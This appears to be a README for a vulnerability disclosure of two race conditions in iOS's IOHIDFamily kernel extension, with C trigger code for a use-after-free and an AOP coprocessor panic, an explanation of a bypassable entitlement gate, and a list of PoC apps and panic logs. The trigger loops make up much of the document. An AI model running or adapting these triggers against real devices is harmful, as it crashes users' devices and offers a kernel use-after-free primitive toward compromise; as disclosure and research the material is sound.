# IOHIDFamily — FastPathUserClient Race Conditions

> **Warning:** Both PoCs will kernel panic / reboot your device. Save all work before running.

Two race conditions in `IOHIDEventServiceFastPathUserClient` (IOHIDFamily kext). No entitlements required. Reachable from the normal app sandbox.

**UAF — copyEvent race (sel2 vs sel1):** The close path (sel1) drops provider state and clears `+0x109` with no lock. copyEvent (sel2) checks a different flag (`+0x108`) under a per-connection lock, then calls into the provider. Multiple connections to the same provider means close and copyEvent operate in different locking domains on shared provider-side objects.

**AOP panic — termination race (didTerminate vs sel0):** `mach_port_destroy` triggers async `didTerminate` → close/teardown, unsynchronized with concurrent sel0 open paths on other connections. This also saturates SPU-backed providers' mailbox, triggering AOP watchdog timeout.

Both vectors use `IOServiceOpen(service, task, 2, &conn)`. The sel0 open gate checks for `FastPathHasEntitlement` and `FastPathMotionEventEntitlement` in the *caller-supplied* OSDictionary rather than the actual entitlement flags stored during `initWithTask` — any sandboxed app passes the gate by including those keys in the input struct.

## Trigger code

**UAF — copyEvent race:**

```c
// open 15 connections to the same IOHIDEventService provider
io_connect_t conns[15];
for (int i = 0; i < 15; i++) {
    IOServiceOpen(service, mach_task_self(), 2, &conns[i]);
    IOConnectCallMethod(conns[i], /*sel*/ 0, &scalar, 1, xml, xmlLen, ...); // gate
}

// thread A: conn[0] rapid close → reopen (lifecycle churn + provider ref drop)
while (!stop) {
    IOConnectCallMethod(conns[0], /*sel*/ 1, &scalar, 1, NULL, 0, ...); // close
    IOConnectCallMethod(conns[0], /*sel*/ 0, &scalar, 1, xml, xmlLen, ...); // reopen
}

// threads B..N: conn[1..N] tight copyEvent loop (per-connection locking only)
while (!stop) {
    uint64_t args[2] = { 0, 1 };
    IOConnectCallMethod(conns[k], /*sel*/ 2, args, 2, NULL, 0, ...); // copyEvent
}
```

**AOP panic — termination race:**

```c
// pre-open 3 opener connections
io_connect_t openers[3];
for (int i = 0; i < 3; i++) {
    IOServiceOpen(service, mach_task_self(), 2, &openers[i]);
    IOConnectCallMethod(openers[i], /*sel*/ 0, &scalar, 1, xml, xmlLen, ...);
}

// opener threads: continuous close → reopen
while (!stop) {
    IOConnectCallMethod(openers[k], /*sel*/ 1, &scalar, 1, NULL, 0, ...);
    IOConnectCallMethod(openers[k], /*sel*/ 0, &scalar, 1, xml, xmlLen, ...);
}

// main thread: batch pre-gate → rapid teardown loop
while (!stop) {
    // create + gate 16 probe connections
    io_connect_t probes[16];
    for (int i = 0; i < 16; i++) {
        IOServiceOpen(service, mach_task_self(), 2, &probes[i]);
        IOConnectCallMethod(probes[i], /*sel*/ 0, &scalar, 1, xml, xmlLen, ...);
    }

    // destroy all probes — each fires async didTerminate → teardown
    // teardown removes/frees provider-facing state while opener threads iterate
    // provider-facing state via the open path
    for (int i = 0; i < 16; i++)
        mach_port_destroy(mach_task_self(), probes[i]);

    usleep(80000); // 80ms race window
}
```

## Contents

| Path | Description |
|------|-------------|
| `UAFPoc/` | iOS app — triggers the UAF (MTE tag fault on A17+, data abort on pre-A17) |
| `AOPPanicPoc/` | iOS app — triggers the AOP coprocessor panic via SPU mailbox saturation |
| `panic-logs/mte-tag-fault.ips` | Kernel tag check fault — iPhone 17 Pro Max (A19 Pro, MTE+PAC) |
| `panic-logs/ipad-data-abort.ips` | Kernel data abort — iPad Pro 12.9" 2nd gen (A10X, no MTE/PAC) |
| `panic-logs/aop-panic.ips` | AOP coprocessor panic — iPhone 17 Pro Max (SPU mailbox overflow) |
